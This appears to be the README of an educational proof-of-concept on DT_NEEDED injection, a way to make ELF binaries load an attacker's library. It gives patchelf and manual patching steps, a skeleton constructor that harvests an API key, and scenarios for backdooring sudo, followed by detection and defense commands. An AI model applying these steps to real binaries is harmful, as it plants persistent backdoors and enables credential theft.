# Part 8: DT_NEEDED Injection - Persistent Library Loading

## Overview

DT_NEEDED injection is a technique that modifies an ELF binary's dynamic section to add a new library dependency. When the modified binary runs, the dynamic linker automatically loads the attacker's library **before main() executes**.

Unlike LD_PRELOAD which requires environment control, DT_NEEDED injection:
- **Persists in the binary** - survives reboots and re-runs
- **No environment needed** - works even with sanitized environments
- **Stealthy** - library appears as a "legitimate" dependency
- **Early execution** - constructor runs before program code

---

## How DT_NEEDED Works

### The Dynamic Section

Every dynamically-linked ELF binary has a `.dynamic` section containing entries that control runtime linking:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         ELF DYNAMIC SECTION                                 │
└─────────────────────────────────────────────────────────────────────────────┘

  typedef struct {
      Elf64_Sxword d_tag;    /* Entry type */
      union {
          Elf64_Xword d_val; /* Integer value */
          Elf64_Addr d_ptr;  /* Address value */
      } d_un;
  } Elf64_Dyn;

  Example dynamic section:
  ─────────────────────────────────────────────────────────────────
    Tag          Value/Pointer    Meaning
    ─────────    ─────────────    ───────────────────────────────
    DT_NEEDED    0x0001           Offset in .dynstr: "libc.so.6"
    DT_NEEDED    0x0025           Offset in .dynstr: "libpthread.so.0"
    DT_NEEDED    0x003f           Offset in .dynstr: "libm.so.6"
    DT_STRTAB    0x400200         Address of string table
    DT_SYMTAB    0x400100         Address of symbol table
    DT_RPATH     0x0060           Offset in .dynstr: "/opt/myapp/lib"
    DT_DEBUG     0x0000           Filled by linker at runtime
    DT_NULL      0x0000           End of dynamic section
```

### Library Loading Process

```
                    execve("./program")
                           │
                           ▼
    ┌─────────────────────────────────────────────────────────────────────┐
    │                    KERNEL                                           │
    │                                                                     │
    │  1. Load ELF header                                                 │
    │  2. Find PT_INTERP → /lib64/ld-linux-x86-64.so.2                   │
    │  3. Load dynamic linker                                             │
    │  4. Transfer control to ld.so                                       │
    └─────────────────────────────────────────────────────────────────────┘
                           │
                           ▼
    ┌─────────────────────────────────────────────────────────────────────┐
    │                    DYNAMIC LINKER (ld.so)                           │
    │                                                                     │
    │  5. Parse program's dynamic section                                 │
    │  6. For each DT_NEEDED entry:                                       │
    │     ┌─────────────────────────────────────────────────────────────┐ │
    │     │  a. Get library name from .dynstr                           │ │
    │     │  b. Search for library (RPATH, LD_LIBRARY_PATH, etc.)       │ │
    │     │  c. Load library into memory                                │ │
    │     │  d. Process library's DT_NEEDED (recursive)                 │ │
    │     │  e. Run library's .init_array constructors  ← ATTACK HERE   │ │
    │     └─────────────────────────────────────────────────────────────┘ │
    │  7. Resolve symbols (PLT/GOT setup)                                │
    │  8. Run program's .init_array                                      │
    │  9. Call main()                                                    │
    └─────────────────────────────────────────────────────────────────────┘
```

### Loading Order

DT_NEEDED entries are processed in order, using **breadth-first search**:

```
    Binary's DT_NEEDED list:
    ───────────────────────────────────────────────────────────────
      [0] libevil.so     ← INJECTED - Loaded FIRST!
      [1] libc.so.6
      [2] libm.so.6

    Load order:
      1. libevil.so        ← Attacker's constructor runs
      2. libc.so.6
      3. libm.so.6
      4. (dependencies of above)
      5. Program's constructors
      6. main()
```

---

## Attack Technique: DT_NEEDED Injection

### Method 1: Using patchelf (Recommended)

```bash
# Add a new DT_NEEDED entry
patchelf --add-needed libevil.so ./target

# The library will be searched in:
#   1. DT_RPATH
#   2. LD_LIBRARY_PATH
#   3. DT_RUNPATH
#   4. /etc/ld.so.cache
#   5. /lib, /usr/lib

# Set RPATH to find our library
patchelf --set-rpath /path/to/evil/libs ./target

# Or use LD_LIBRARY_PATH at runtime
LD_LIBRARY_PATH=/path/to/evil/libs ./target
```

### Method 2: Manual Binary Patching

```
ATTACK FLOW:
─────────────────────────────────────────────────────────────────

  1. Find a sacrificial dynamic entry (DT_DEBUG is ideal)
     - DT_DEBUG is only used by debuggers
     - Set to 0 in the file, filled at runtime

  2. Add library name to .dynstr (or reuse existing string)
     - May require extending section
     - Or overwriting unused strings

  3. Convert DT_DEBUG to DT_NEEDED
     - Change d_tag from 21 (DT_DEBUG) to 1 (DT_NEEDED)
     - Set d_val to string offset in .dynstr

  4. Binary now loads attacker's library automatically

BEFORE:
  ┌────────────────────────────────┐
  │ DT_NEEDED  →  libc.so.6       │
  │ DT_NEEDED  →  libm.so.6       │
  │ DT_DEBUG   →  (unused)        │  ← Target this entry
  │ DT_NULL    →  (end)           │
  └────────────────────────────────┘

AFTER:
  ┌────────────────────────────────┐
  │ DT_NEEDED  →  libc.so.6       │
  │ DT_NEEDED  →  libm.so.6       │
  │ DT_NEEDED  →  libevil.so      │  ← Now loads our library!
  │ DT_NULL    →  (end)           │
  └────────────────────────────────┘
```

### Method 3: Replace Existing DT_NEEDED

```
If you can't add entries, replace an existing one:

  1. Find a DT_NEEDED entry for a library you can impersonate
  2. Change the string offset to point to your library name
  3. Provide a library with the same symbols

BEFORE:                              AFTER:
  DT_NEEDED → libhelper.so     →     DT_NEEDED → libevil.so

  (Attacker's libevil.so exports same symbols as libhelper.so)
```

---

## The Malicious Library

### Constructor Execution

```c
/* evil_needed.c - Library loaded via DT_NEEDED injection */

#include <stdio.h>
#include <stdlib.h>

/* This runs BEFORE main() */
__attribute__((constructor))
void evil_init(void) {
    /* Steal secrets */
    char *api_key = getenv("API_KEY");
    if (api_key) {
        /* Exfiltrate to attacker */
        log_to_file("/tmp/stolen.txt", api_key);
    }

    /* Establish persistence */
    /* ... */

    /* Hook functions */
    /* ... */
}

/* Also exports symbols to shadow legitimate functions */
int some_function(void) {
    /* Malicious implementation */
    return call_real_function();
}
```

### Symbol Interposition

Since DT_NEEDED libraries are searched in order, an injected library can shadow symbols:

```
Symbol Resolution Order:
─────────────────────────────────────────────────────────────────

  Program calls: getenv("SECRET")
                      │
                      ▼
  Search order:
    1. libevil.so (INJECTED) → Has getenv? YES → Use this one!
    2. libc.so.6             → (never reached for this symbol)

  Attacker's getenv() can:
    - Log all environment variable accesses
    - Return modified values
    - Call the real getenv() after logging
```

---

## Real-World Attack Scenarios

### Scenario 1: Binary Backdoor

```
ATTACK:
─────────────────────────────────────────────────────────────────

  1. Attacker gains write access to /usr/bin/sudo
  2. Injects DT_NEEDED entry: libbackdoor.so
  3. Places libbackdoor.so in /usr/lib/
  4. Every sudo invocation:
     - Logs username and password
     - Sends to attacker's server
     - Allows normal execution to continue
```

### Scenario 2: Supply Chain Attack

```
ATTACK:
─────────────────────────────────────────────────────────────────

  1. Attacker compromises build server
  2. Modifies compiled binaries to include DT_NEEDED
  3. Ships infected binaries to users
  4. No source code changes needed
  5. Survives rebuilds from clean source
```

### Scenario 3: Container Escape Setup

```
ATTACK:
─────────────────────────────────────────────────────────────────

  1. Modify container's /usr/bin/su or /usr/bin/sudo
  2. Inject library that:
     - Monitors for privilege escalation
     - Intercepts credentials
     - Attempts container escape when root
```

---

## Comparison with Other Techniques

| Technique | Persistence | Requires Env | Detection Difficulty |
|-----------|-------------|--------------|---------------------|
| **DT_NEEDED Injection** | In binary | No | Hard (looks legitimate) |
| LD_PRELOAD | Per-execution | Yes | Easy (env visible) |
| DT_RPATH | In binary | No | Medium |
| GOT Hijacking | Runtime only | No | Medium |
| .init_array | In library | No | Hard |

### Why DT_NEEDED is Powerful

```
PERSISTENCE:
  LD_PRELOAD:     Cleared on exec, needs shell config
  DT_NEEDED:      Embedded in binary, always works

STEALTH:
  LD_PRELOAD:     Visible in /proc/PID/environ
  DT_NEEDED:      Looks like normal dependency

SUID BINARIES:
  LD_PRELOAD:     Ignored for SUID binaries
  DT_NEEDED:      STILL WORKS! (part of binary)
```

---

## Detection Methods

### Checking for Injected Libraries

```bash
# Compare DT_NEEDED against known good
readelf -d /usr/bin/sudo | grep NEEDED

# Check for unusual libraries
ldd /usr/bin/target | grep -v "linux-vdso\|libc\|libm\|libpthread"

# Verify library paths
for lib in $(ldd /usr/bin/target | awk '{print $3}'); do
    rpm -qf "$lib" 2>/dev/null || dpkg -S "$lib" 2>/dev/null || echo "UNKNOWN: $lib"
done
```

### File Integrity Monitoring

```bash
# Check against package manager
rpm -V packagename      # RPM-based
debsums packagename     # Debian-based

# AIDE/Tripwire for custom monitoring
aide --check
```

### Runtime Detection

```c
/* Check for unexpected libraries */
int callback(struct dl_phdr_info *info, size_t size, void *data) {
    /* Verify each loaded library against whitelist */
    if (!is_known_library(info->dlpi_name)) {
        alert("Unknown library loaded: %s", info->dlpi_name);
    }
    return 0;
}
dl_iterate_phdr(callback, NULL);
```

---

## Defense Strategies

### 1. File Integrity Protection

```bash
# Use immutable attribute
chattr +i /usr/bin/critical_binary

# Mount /usr as read-only
mount -o remount,ro /usr
```

### 2. Binary Signing

```bash
# Sign binaries and verify at load time
# (Requires kernel support: IMA/EVM, dm-verity)
evmctl sign --key /path/to/key /usr/bin/binary
```

### 3. Library Whitelist

```bash
# Restrict library loading paths
# In /etc/ld.so.conf, minimize trusted paths

# Use LD_LIBRARY_PATH restrictions
# (Limited effectiveness)
```

### 4. Monitoring

```bash
# Alert on binary modifications
inotifywait -m -r /usr/bin /usr/sbin -e modify

# Monitor library loading
LD_DEBUG=libs ./program 2>&1 | grep "calling init"
```

---

## Files in This POC

| File | Description |
|------|-------------|
| `dt_needed_explorer.c` | Explore DT_NEEDED entries in ELF binaries |
| `dt_needed_injector.c` | Manual injection tool (educational) |
| `evil_needed.c` | Malicious library with constructor |
| `victim.c` | Target program for demonstration |
| `Makefile` | Build and run demonstrations |

## Building and Running

```bash
# Build all components
make all

# Run full demonstration
make demo

# Individual demonstrations
make explore          # Explore DT_NEEDED entries
make show-deps        # Show victim's dependencies
make inject-demo      # Full injection demonstration
make compare          # Compare before/after

# Clean up
make clean
```

---

## Key Takeaways

1. **DT_NEEDED entries are trusted** - The linker loads them automatically without verification

2. **Persistence in binary** - Unlike LD_PRELOAD, DT_NEEDED injection survives across executions

3. **Works on SUID binaries** - LD_PRELOAD is ignored for SUID, but DT_NEEDED is honored

4. **Early execution** - Injected library's constructor runs before main()

5. **Looks legitimate** - Appears as normal dependency, hard to detect

6. **Binary modification required** - Attacker needs write access to target binary

7. **patchelf makes it easy** - Simple command-line tool for injection
